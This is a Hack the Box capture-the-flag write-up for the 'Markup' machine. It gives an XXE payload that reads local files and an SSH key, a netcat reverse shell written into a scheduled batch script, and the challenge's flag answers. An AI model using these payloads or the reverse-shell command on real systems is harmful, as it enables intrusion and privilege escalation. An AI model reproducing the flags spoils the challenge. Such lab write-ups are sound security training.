# Markup
* Source: [Hack the Box](https://hackthebox.com/)
* Challenge: Markup
* Topic: XXE
* Difficulty: Very easy
* Date: 18-04-2022
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Tasks
1. What version of Apache is running on the target's port 80? 
 - **2.4.41**
2. What username:password combination logs in successfully? 
- **admin:password**
3. What is the word at the top of the page that accepts user input? 
- **order**
4.  What XML version is used on the target?
- **1.0**
5. What does the XXE / XEE attack acronym stand for? 
- **XML External Entity**
6. What username can we find on the webpage's HTML code? 
- **daniel**
7. What is the file located in the Log-Management folder on the target? 
- **job.bat**
8. What executable is mentioned in the file mentioned before? 
- **wevtutil.exe**
9. Submit user flag 
- **032d2fc8952a8c24e39c8f0ee9918ef7**
10. Submit root flag 
 - **f574a3e7650cebd8c39784299cb570f8**

---
## Flag:
Nmap:

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap -n -sC -sV 10.129.71.16
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-18 17:22 EDT
Nmap scan report for 10.129.71.16
Host is up (0.068s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9f:a0:f7:8c:c6:e2:a4:bd:71:87:68:82:3e:5d:b7:9f (RSA)
|   256 90:7d:96:a9:6e:9e:4d:40:94:e7:bb:55:eb:b3:0b:97 (ECDSA)
|_  256 f9:10:eb:76:d4:6d:4f:3e:17:f3:93:d6:0b:8c:4b:81 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: MegaShopping
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
|_http-title: MegaShopping
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set

Nmap done: 1 IP address (1 host up) scanned in 24.63 seconds
```

A simple login page. 

![](./attachments/Pasted%20image%2020220418232954.png)

We can access the site with some simple default credentials.

User:pass `admin:password`

It has an order page we might be able to break.

![](./attachments/Pasted%20image%2020220418233408.png)

Let's have a look at the request using Burp.

![](./attachments/Pasted%20image%2020220418234028.png)

This XML code might be vulnerable to XML External Entity, we can test it by editing the code.

```xml
<?xml version = "1.0"?>
	<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>
	<order>
		<quantity>
			10
		</quantity>
		<item>
			&test;
		</item>
		<address>
			haxxx
		</address>
	</order>
```

It executes the .exe file, which means the site is vulnerable.

![](./attachments/Pasted%20image%2020220418235646.png)

Since the server is also running SSH, we might be able to find something interesting in its path. 

We found Daniel's SSH private key.

![](./attachments/Pasted%20image%2020220419000022.png)

Insert it into a file and connect with `ssh`

```
┌──(kali㉿kali)-[~/Downloads]
└─$ ssh -i ssh_key daniel@10.129.71.16

Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

daniel@MARKUP C:\Users\daniel>
```

We are in! We can see our privileges with `whoami /priv`.

```
daniel@MARKUP C:\Users\daniel>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Nothing useful.

Looking around.
```
C:\Users\Administrator\Desktop> cd C:\Users\daniel\Desktop         
 cd C:\Users\daniel\Desktop

C:\Users\daniel\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BA76-B4E3

 Directory of C:\Users\daniel\Desktop

03/05/2020  07:18 AM    <DIR>          .
03/05/2020  07:18 AM    <DIR>          ..
03/05/2020  07:18 AM                35 user.txt
               1 File(s)             35 bytes
               2 Dir(s)   7,381,458,944 bytes free

C:\Users\daniel\Desktop>type user.txt
type user.txt
032d2fc8952a8c24e39c8f0ee9918ef7 
```

The user flag: `032d2fc8952a8c24e39c8f0ee9918ef7`

Upon further inspection, we find:

```console
daniel@MARKUP C:\>dir 
 Volume in drive C has no label.                      
 Volume Serial Number is BA76-B4E3                    
                                                      
 Directory of C:\                                     
                                                      
03/12/2020  03:56 AM    <DIR>          Log-Management 
09/15/2018  12:12 AM    <DIR>          PerfLogs       
07/28/2021  02:01 AM    <DIR>          Program Files  
09/15/2018  12:21 AM    <DIR>          Program Files (x86)
07/28/2021  03:38 AM                 0 Recovery.txt
03/05/2020  05:40 AM    <DIR>          Users
07/28/2021  02:16 AM    <DIR>          Windows
03/05/2020  10:15 AM    <DIR>          xampp
               1 File(s)              0 bytes
               7 Dir(s)   7,381,598,208 bytes free
```

`Log-Management` is a non-standard directory, let's have a look.

```console
daniel@MARKUP C:\Log-Management>dir 
 Volume in drive C has no label. 
 Volume Serial Number is BA76-B4E3

 Directory of C:\Log-Management

03/12/2020  03:56 AM    <DIR>          .
03/12/2020  03:56 AM    <DIR>          ..
03/06/2020  02:42 AM               346 job.bat
               1 File(s)            346 bytes
               2 Dir(s)   7,381,303,296 bytes free
```

`job.bat`, what is that?

```console
daniel@MARKUP C:\Log-Management>type job.bat
@echo off 
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
wevtutil.exe cl %1
goto :eof
:noAdmin
echo You must run this script as an Administrator!
:theEnd
exit
```

It's a script used for clearing log files. If we edit it, we will be able to make the target call us via netcat.

We need to upload `nc64.exe` to the target.

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe
--2022-04-18 18:42:14--  https://github.com/int0x33/nc.exe/blob/master/nc64.exe
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘nc64.exe’

nc64.exe                   [   <=>                   ] 123.77K   585KB/s    in 0.2s    

2022-04-18 18:42:15 (585 KB/s) - ‘nc64.exe’ saved [126741]

┌──(kali㉿kali)-[~/Downloads]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Back on the host, we need to open `powershell` and get the file.

```console
daniel@MARKUP C:\Log-Management>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.


PS C:\Log-Management> wget http://10.10.14.15:8000/nc64.exe -outfile nc64.exe
PS C:\Log-Management> dir

    Directory: C:\Log-Management

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/6/2020   1:42 AM            346 job.bat
-a----        4/18/2022   3:48 PM         126741 nc64.exe

PS C:\Log-Management> exit
```

Now we can override the `job.bat` script with the following command and hope it executes.

`echo C:\Log-Management\nc64.exe -e cmd.exe 10.10.14.15 4444 > C:\Log-Management\job.bat`

After a few executions, we get a connection.

```console
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444 
listening on [any] 4444 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.95.192] 49678
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32>cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is BA76-B4E3

 Directory of C:\Users\Administrator\Desktop

03/05/2020  07:33 AM    <DIR>          .
03/05/2020  07:33 AM    <DIR>          ..
03/05/2020  07:33 AM                70 root.txt
               1 File(s)             70 bytes
               2 Dir(s)   7,338,610,688 bytes free

C:\Users\Administrator\Desktop>type root.txt    
f574a3e7650cebd8c39784299cb570f8
```

The final flag.

**Flag:** `f574a3e7650cebd8c39784299cb570f8`

---
**Tags:** [[Hack The Box]]